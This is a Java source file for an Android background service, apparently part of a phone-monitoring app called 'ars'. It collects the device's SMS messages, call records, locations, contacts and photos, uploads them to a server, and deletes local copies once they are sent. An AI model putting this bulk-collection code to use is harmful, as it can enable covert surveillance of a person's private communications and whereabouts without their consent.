package net.deerhunter.ars.protocol;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import net.deerhunter.ars.R;
import net.deerhunter.ars.application.ArsApplication;
import net.deerhunter.ars.contact_structs.ContactList;
import net.deerhunter.ars.contact_structs.ContactsManager;
import net.deerhunter.ars.inner_structures.ControlConstants;
import net.deerhunter.ars.protocol.packets.CallPacket;
import net.deerhunter.ars.protocol.packets.ContactPacket;
import net.deerhunter.ars.protocol.packets.DataType;
import net.deerhunter.ars.protocol.packets.LocationPacket;
import net.deerhunter.ars.protocol.packets.MainPacket;
import net.deerhunter.ars.protocol.packets.SMSPacket;
import net.deerhunter.ars.protocol.packets.ImagePacket;
import net.deerhunter.ars.providers.ActivityContract;
import net.deerhunter.ars.providers.ActivityContract.Contacts;
import net.deerhunter.ars.providers.ActivityContract.Thumbnails;
import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.Bitmap.CompressFormat;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Process;
import android.provider.MediaStore;

/**
 * This service is used to send packets to the server.
 * 
 * @author DeerHunter
 */
public class PacketSenderService extends Service {

	private Looper serviceLooper;
	private ServiceHandler serviceHandler;

	// Handler that receives messages from the thread
	@SuppressLint("HandlerLeak")
	private final class ServiceHandler extends Handler {
		public ServiceHandler(Looper looper) {
			super(looper);
		}

		@Override
		public void handleMessage(Message msg) {

			sendNewSMS();

			sendNewCalls();

			sendNewLocations();

			if (msg.getData().getInt("type") == ConnectivityManager.TYPE_MOBILE) {
				SharedPreferences prefs = ArsApplication.getInstance().getAppPrefs();
				Context context = ArsApplication.getInstance().getApplicationContext();
				int mode = prefs.getInt(context.getString(R.string._3gModuleSettings), ControlConstants.MICRO_THUMB_PHOTO);
				if (mode != ControlConstants.WITHOUT_PHOTO)
					sendNewThumbnails(mode);
			} else {
				sendNewThumbnails(ControlConstants.FULL_PHOTO);
			}

			sendContactsIfNeed();

			// Stop the service using the startId, so that we don't stop
			// the service in the middle of handling another job
			stopSelf(msg.arg1);
		}

		private void sendContactsIfNeed() {
			SharedPreferences prefs = ArsApplication.getInstance().getAppPrefs();
			Editor prefsEditor = prefs.edit();
			boolean needSendContacts = prefs.getBoolean(getString(R.string.needToSendContacts), false);
			boolean onlyNew = prefs.getBoolean(getString(R.string.sendOnlyNewContacts), false);
			if (needSendContacts) {
				if (sendContacts(onlyNew))
					prefsEditor.putBoolean(getString(R.string.needToSendContacts), false);
			}
			prefsEditor.apply();
		}

		private boolean sendContacts(boolean onlyNew) {
			boolean areContactsSent = true;
			ContactsManager contactsManager = ContactsManager.getInstance();
			ContactList contacts = contactsManager.newContactList();
			List<Integer> sentContactsIds = new ArrayList<Integer>();
			if (onlyNew) {
				Cursor cursor = getContentResolver().query(Contacts.CONTENT_URI, null, null, null, null);
				if (cursor != null && cursor.moveToFirst()) {
					do {
						sentContactsIds.add(cursor.getInt(cursor.getColumnIndex(Contacts.SENT_CONTACT_ID)));
					} while (cursor.moveToNext());
				}
			}
			for (ContactPacket contact : contacts.getContacts()) {
				if (onlyNew && sentContactsIds.contains(contact.getId()))
					continue;
				boolean uploaded = false;
				try {
					uploaded = Uploader.sendPacket(new MainPacket(DataType.CONTACT, contact.generateBinaryPacket()),
							PacketSenderService.this);
				} catch (IOException ex) {}

				if (uploaded) {
					ContentValues sentContact = new ContentValues();
					sentContact.put(ActivityContract.Contacts.SENT_CONTACT_ID, contact.getId());
					getContentResolver().insert(ActivityContract.Contacts.CONTENT_URI, sentContact);
				} else {
					areContactsSent = false;
				}

			}
			return areContactsSent;
		}

		/**
		 * Sends new locations to the server.
		 */
		private void sendNewLocations() {
			Cursor c = null;
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved locations
				c = cr.query(ActivityContract.Locations.CONTENT_URI, null, null, null, null);
				if (c == null)
					return;
				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.Locations._ID_COLUMN);
					double latitude = c.getDouble(ActivityContract.Locations.LATITUDE_COLUMN);
					double longitude = c.getDouble(ActivityContract.Locations.LONGITUDE_COLUMN);
					double altitude = c.getDouble(ActivityContract.Locations.ALTITUDE_COLUMN);
					float accuracy = c.getFloat(ActivityContract.Locations.ACCURACY_COLUMN);
					String provider = c.getString(ActivityContract.Locations.PROVIDER_COLUMN);
					long time = c.getLong(ActivityContract.Locations.TIME_COLUMN);

					LocationPacket location = new LocationPacket(latitude, longitude, altitude, accuracy, provider,
							time);

					boolean uploaded = Uploader.sendPacket(
							new MainPacket(DataType.LOCATION, location.getBinaryPacket()), PacketSenderService.this);

					if (uploaded)
						cr.delete(ActivityContract.Locations.CONTENT_URI, "_id = ?", new String[] { "" + id });

				}

			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (c != null)
					c.close();
			}
		}

		/**
		 * Sends new thumbnails to the server.
		 */
		private void sendNewThumbnails(int mode) {
			Cursor c = null;
			try {
				ContentResolver cr = getContentResolver();

				// Return new saved images
				String where = Thumbnails.DELETED + " = 0 AND " + Thumbnails.THUMBNAIL_SENT + " = 0 AND "
						+ Thumbnails.FULL_IMAGE_SENT + " = 0";
				c = cr.query(ActivityContract.Thumbnails.CONTENT_URI, new String[] { Thumbnails.MEDIASTORE_ID,
						Thumbnails._ID }, where, null, null);
				if (c == null)
					return;
				while (c.moveToNext()) {
					int storeId = c.getInt(0); // save store_id;
					Cursor imageInfoCursor = cr.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, new String[] {
							MediaStore.Images.Media.DISPLAY_NAME, MediaStore.Images.Media.DATA,
							MediaStore.Images.Media.DATE_ADDED }, "_id = ?", new String[] { String.valueOf(storeId) },
							null);
					if (imageInfoCursor == null)
						continue;
					imageInfoCursor.moveToFirst();
					if (imageInfoCursor.getCount() == 0) { // file is not found
						ContentValues value = new ContentValues();
						value.put(Thumbnails.DELETED, "1");
						cr.update(ActivityContract.Thumbnails.CONTENT_URI, value, Thumbnails.MEDIASTORE_ID + " = ?",
								new String[] { String.valueOf(storeId) });
					} else { // file is present
						String displayName = imageInfoCursor.getString(0);
						String filePath = imageInfoCursor.getString(1);
						long dateAdded = imageInfoCursor.getLong(2);
						Bitmap image;
						if (mode == ControlConstants.FULL_PHOTO) {
							image = MediaStore.Images.Media.getBitmap(cr,
									ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, storeId));
						} else {
							BitmapFactory.Options bitmapOptions = new BitmapFactory.Options();
							image = MediaStore.Images.Thumbnails.getThumbnail(cr, storeId, mode, bitmapOptions);
						}
						if (image == null) { // some problems with creating
												// new thumbnail
							continue;
						}
						ByteArrayOutputStream outputStream = new ByteArrayOutputStream(10000);
						image.compress(CompressFormat.JPEG, 50, outputStream);

						ImagePacket thumbnailPacket = new ImagePacket(displayName, filePath, storeId,
								dateAdded, outputStream.toByteArray());

						boolean uploaded = Uploader.sendPacket(
								new MainPacket(DataType.IMAGE, thumbnailPacket.getBinaryPacket()),
								PacketSenderService.this);

						if (uploaded) {
							ContentValues value = new ContentValues();
							value.put(Thumbnails.THUMBNAIL_SENT, "1");
							cr.update(ActivityContract.Thumbnails.CONTENT_URI, value, Thumbnails._ID + " = ?",
									new String[] { String.valueOf(c.getInt(1)) });
						}
					}
					imageInfoCursor.close();
				}

			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (c != null)
					c.close();
			}
		}

		/**
		 * Sends new calls to the server.
		 */
		private void sendNewCalls() {
			Cursor c = null;
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved calls
				c = cr.query(ActivityContract.Calls.CONTENT_URI, null, null, null, null);
				if (c == null)
					return;
				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.Calls._ID_COLUMN);
					String caller = c.getString(ActivityContract.Calls.CALLER_COLUMN);
					String recipient = c.getString(ActivityContract.Calls.RECIPIENT_COLUMN);
					String caller_phone_number = c.getString(ActivityContract.Calls.CALLER_PHONE_NUMBER_COLUMN);
					String recipient_phone_number = c.getString(ActivityContract.Calls.RECIPIENT_PHONE_NUMBER_COLUMN);
					long time = c.getLong(ActivityContract.Calls.TIME_COLUMN);

					CallPacket call = new CallPacket(caller, recipient, caller_phone_number, recipient_phone_number,
							time);

					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.CALL, call.getBinaryPacket()),
							PacketSenderService.this);

					if (uploaded)
						cr.delete(ActivityContract.Calls.CONTENT_URI, "_id = ?", new String[] { "" + id });

				}

			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (c != null)
					c.close();
			}
		}

		/**
		 * Sends new SMSes to the server.
		 */
		private void sendNewSMS() {
			Cursor c = null;
			try {
				ContentResolver cr = getContentResolver();

				// Return all the saved SMS
				c = cr.query(ActivityContract.SMS.CONTENT_URI, null, null, null, null);
				if (c == null)
					return;
				while (c.moveToNext()) {
					int id = c.getInt(ActivityContract.SMS._ID_COLUMN);
					String sender = c.getString(ActivityContract.SMS.SENDER_COLUMN);
					String recipient = c.getString(ActivityContract.SMS.RECIPIENT_COLUMN);
					String sender_phone_number = c.getString(ActivityContract.SMS.SENDER_PHONE_NUMBER_COLUMN);
					String recipient_phone_number = c.getString(ActivityContract.SMS.RECIPIENT_PHONE_NUMBER_COLUMN);
					long time = c.getLong(ActivityContract.SMS.TIME_COLUMN) / 1000;
					String sms_body = c.getString(ActivityContract.SMS.SMS_BODY_COLUMN);

					SMSPacket sms = new SMSPacket(sender, recipient, sender_phone_number, recipient_phone_number, time,
							sms_body);

					boolean uploaded = Uploader.sendPacket(new MainPacket(DataType.SMS, sms.getBinaryPacket()),
							PacketSenderService.this);

					if (uploaded)
						cr.delete(ActivityContract.SMS.CONTENT_URI, "_id = ?", new String[] { "" + id });
				}

			} catch (IOException e) {
				e.printStackTrace();
			} finally {
				if (c != null)
					c.close();
			}
		}

	}

	@Override
	public void onCreate() {
		// Start up the thread running the service. Note that we create a
		// separate thread because the service normally runs in the process's
		// main thread, which we don't want to block. We also make it
		// background priority so CPU-intensive work will not disrupt our UI.
		HandlerThread thread = new HandlerThread("ServiceStartArguments", Process.THREAD_PRIORITY_BACKGROUND);
		thread.start();

		// Get the HandlerThread's Looper and use it for our Handler
		serviceLooper = thread.getLooper();
		serviceHandler = new ServiceHandler(serviceLooper);
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// For each start request, send a message to start a job and deliver the
		// start ID so we know which request we're stopping when we finish the
		// job
		Message msg = serviceHandler.obtainMessage();
		msg.arg1 = startId;

		Bundle fileData = intent.getExtras();
		msg.setData(fileData);

		serviceHandler.sendMessage(msg);

		// If we get killed, after returning from here, restart
		return START_STICKY;
	}

	@Override
	public IBinder onBind(Intent intent) {
		// We don't provide binding, so return null
		return null;
	}

	@Override
	public void onDestroy() {}
}
